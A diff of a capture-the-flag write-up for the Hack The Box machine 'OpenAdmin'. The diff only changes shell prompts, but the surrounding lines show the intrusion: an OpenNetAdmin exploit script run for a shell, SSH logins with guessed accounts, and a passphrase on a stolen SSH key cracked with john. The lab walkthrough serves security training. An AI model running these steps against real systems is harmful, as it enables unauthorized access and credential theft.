@@ -17,7 +17,7 @@ http://openadmin.htb/ona/
 
 # foothold as www-data
 ```console
-kali@kali:~/HTB/openadmin$ ./47691.sh 'http://openadmin.htb/ona/'
+bibo318@parrot:~/HTB/openadmin$ ./47691.sh 'http://openadmin.htb/ona/'
 ./47691.sh: line 8: $'\r': command not found
 ./47691.sh: line 16: $'\r': command not found
 ./47691.sh: line 18: $'\r': command not found
@@ -26,9 +26,9 @@ kali@kali:~/HTB/openadmin$ ./47691.sh 'http://openadmin.htb/ona/'
 ```
 to fix this run
 ```console
-kali@kali:~/HTB/openadmin$ dos2unix 47691.sh 
+bibo318@parrot:~/HTB/openadmin$ dos2unix 47691.sh 
 dos2unix: converting file 47691.sh to Unix format...
-kali@kali:~/HTB/openadmin$ ./47691.sh 'http://openadmin.htb/ona/'
+bibo318@parrot:~/HTB/openadmin$ ./47691.sh 'http://openadmin.htb/ona/'
 $ id
 $ ls
 config
@@ -112,7 +112,7 @@ $ python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
 nope didnt work here... anyway port 22 ssh is open, why not just try it out
 ```console
-kali@kali:~/HTB/openadmin$ ssh ona_sys@openadmin.htb
+bibo318@parrot:~/HTB/openadmin$ ssh ona_sys@openadmin.htb
 The authenticity of host 'openadmin.htb (10.10.10.171)' can't be established.
 ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -121,12 +121,12 @@ ona_sys@openadmin.htb's password:
 Permission denied, please try again.
 ona_sys@openadmin.htb's password: 
 
-kali@kali:~/HTB/openadmin$ ssh joanna@openadmin.htb
+bibo318@parrot:~/HTB/openadmin$ ssh joanna@openadmin.htb
 joanna@openadmin.htb's password: 
 Permission denied, please try again.
 joanna@openadmin.htb's password: 
 
-kali@kali:~/HTB/openadmin$ ssh jimmy@openadmin.htb
+bibo318@parrot:~/HTB/openadmin$ ssh jimmy@openadmin.htb
 jimmy@openadmin.htb's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 
@@ -258,15 +258,15 @@ now copy the key content and paste in kali
 # foothold as Joanna
 as you can see the key is encrypted which will ask us for a passphase if you will use the key. I try to `ssh` and using jimmy's password again since in one of the `.php` said something like `dont forget that we are ninja`. But it didnt works.. so let use `ssh2john` to passphase hash then use `john` to crack it
 ```console
-root@kali:/home/kali/HTB/openadmin# find / -name ssh2john*
+bibo318@kali:/home/kali/HTB/openadmin# find / -name ssh2john*
 /usr/share/john/ssh2john.py
-kali@kali:~/HTB/openadmin$ /usr/share/john/ssh2john.py joanna.pub > hash.txt
-kali@kali:~/HTB/openadmin$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+bibo318@parrot:~/HTB/openadmin$ /usr/share/john/ssh2john.py joanna.pub > hash.txt
+bibo318@parrot:~/HTB/openadmin$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 bloodninjas      (joanna.pub)
 ```
 WE GOT THE PASSWORD!!! let's ssh as Joanna
 ```
-kali@kali:~/HTB/openadmin$ ssh joanna@openadmin.htb -i joanna.pub
+bibo318@parrot:~/HTB/openadmin$ ssh joanna@openadmin.htb -i joanna.pub
 load pubkey "joanna.pub": invalid format
 Enter passphrase for key 'joanna.pub': 
 joanna@openadmin:~$ cat user.txt
